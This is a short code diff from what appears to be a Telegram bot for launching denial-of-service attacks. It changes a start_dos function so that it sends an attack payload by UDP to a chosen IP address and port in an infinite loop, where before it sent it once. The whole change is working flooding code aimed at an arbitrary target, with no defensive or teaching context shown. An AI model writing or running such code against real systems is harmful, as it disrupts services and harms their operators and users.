@@ -27,4 +27,5 @@ async def get_ping(message: Message, dos_data: FSMContextProxy):
 
 
 async def start_dos(connect, ip: str, port: int, attack: bytes):
-    connect.sendto(attack, (ip, port))
+    while True:
+        connect.sendto(attack, (ip, port))
